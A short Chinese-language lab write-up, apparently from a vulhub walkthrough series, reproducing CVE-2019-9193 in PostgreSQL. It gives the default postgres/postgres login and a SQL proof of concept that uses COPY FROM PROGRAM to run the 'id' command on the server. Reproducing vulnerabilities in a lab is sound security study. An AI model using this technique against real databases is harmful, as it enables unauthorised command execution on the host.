# PostgreSQL 高权限命令执行漏洞（CVE-2019-9193）

###### by ADummy

### 0x00利用路线

​			连接到数据库，直接命令执行

### 0x01漏洞介绍

​			PostgreSQL 是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。

影响版本

```
PostgreSQL < 11
```

### 0x02漏洞复现

环境启动后，将开启Postgres默认的5432端口，默认账号密码为postgres/postgres。

登录postgres: `psql --host your-ip --username postgres`

并执行参考链接中的POC：

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

`FROM PROGRAM`语句将执行命令id并将结果保存在cmd_exec表中：

![PostgreSQL_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PostgreSQL_RCE_1.png)













